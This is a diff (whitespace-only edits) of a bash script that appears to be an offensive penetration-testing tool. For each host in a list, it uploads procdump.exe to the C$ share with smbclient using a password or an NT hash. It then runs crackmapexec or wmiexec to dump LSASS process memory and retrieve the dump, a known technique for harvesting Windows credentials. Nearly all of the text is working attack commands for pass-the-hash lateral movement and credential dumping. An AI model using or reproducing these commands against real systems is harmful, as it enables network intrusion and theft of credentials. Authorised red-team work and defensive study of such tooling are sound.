@@ -61,7 +61,7 @@ fi
 while getopts "u:p:d:f:h:P:m:H:" FLAG
 do
     case $FLAG in
-		u)  USERNAME=${OPTARG};;
+	u)  USERNAME=${OPTARG};;
         p)  PASSWORD=${OPTARG};;
         d)  DOMAIN=${OPTARG};;
         f)
@@ -117,15 +117,15 @@ for TARGETIP in `cat $HOSTFILE`
 do
 	echo "===| Connecting to $TARGETIP and uploading $PROCDUMP! |==="
 	if [ -z ${PASSWORD+x} ]; then
-    	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "put $PROCDUMP procdump.exe"
-    else
-		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "put $PROCDUMP procdump.exe"
+    		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U $USERNAME --pw-nt-hash $HASH -c "put $PROCDUMP procdump.exe"
+	else
+    		$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "put $PROCDUMP procdump.exe"
 	fi
 	echo
 	echo "===| Dumping memory on $TARGETIP! |==="
 	if [ "$METHOD" == "crackmapexec" ] || [ "$DOMAIN" == "."  ]; then
 		if [ -z ${PASSWORD+x} ]; then
-            $CRACK $TARGETIP -u $USERNAME -H $HASH --local-auth -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
+			$CRACK $TARGETIP -u $USERNAME -H $HASH --local-auth -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
 		else
 			$CRACK $TARGETIP -u $USERNAME -p $PASSWORD --local-auth -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
 		fi
@@ -134,10 +134,10 @@ do
 			$CRACK $TARGETIP -u $USERNAME -H $HASH -d $DOMAIN -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
 		else
 			$CRACK $TARGETIP -u $USERNAME -p $PASSWORD -d $DOMAIN -x 'cmd.exe /c procdump.exe -accepteula -ma lsass.exe lsass.dmp'
-        fi
+        	fi
 	elif [ "$METHOD" == "wmiexec" ]; then
         	python $WMIEXEC "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGETIP" 'procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp'
-    fi
+	fi
 	echo
 	echo "===| Retrieving the dump... Muh dumps, muh dumps. Muh lovely LSASS dumps! |==="
 	if [ -z ${PASSWORD+x} ]; then
